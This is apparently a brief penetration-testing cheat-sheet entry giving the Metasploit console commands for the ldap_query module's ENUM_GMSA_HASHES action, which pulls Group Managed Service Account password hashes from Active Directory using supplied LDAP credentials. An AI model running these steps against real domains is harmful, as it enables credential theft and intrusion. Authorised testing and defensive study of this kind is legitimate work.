# Metasploit - Credential Extraction

### 1) Extract GMSA Password hashes

    use auxiliary/gather/ldap_query

Execution

    set LDAPUSERNAME user
    set LDAPPASSWORD password
    set ACTION ENUM_GMSA_HASHES
    run

